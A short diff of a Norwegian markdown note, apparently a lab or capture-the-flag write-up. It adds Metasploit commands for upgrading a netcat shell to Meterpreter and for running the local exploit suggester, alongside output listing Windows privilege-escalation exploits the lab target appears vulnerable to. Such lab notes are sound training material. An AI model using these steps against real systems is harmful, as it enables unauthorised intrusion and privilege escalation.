@@ -58,7 +58,11 @@ oppgradere fra nc til metasploit til meterpreter
 
 background session med ctrl z&lt;
 
-use post/multi/manage/shell\_to\_meterpreter
+`use post/multi/manage/shell_to_meterpreter`
+
+```
+use post/multi/recon/local_exploit_suggester 
+```
 
 \[+\] 10.10.10.5 - exploit/windows/local/bypassuac\_eventvwr: The target appears to be vulnerable.
 
@@ -81,6 +85,4 @@ use post/multi/manage/shell\_to\_meterpreter
 \[+\] 10.10.10.5 - exploit/windows/local/ms16\_032\_secondary\_logon\_handle\_privesc: The target service is running, but could not be validated.
 
 \[+\] 10.10.10.5 - exploit/windows/local/ppr\_flatten\_rec: The target appears to be vulnerable.
-
-
 
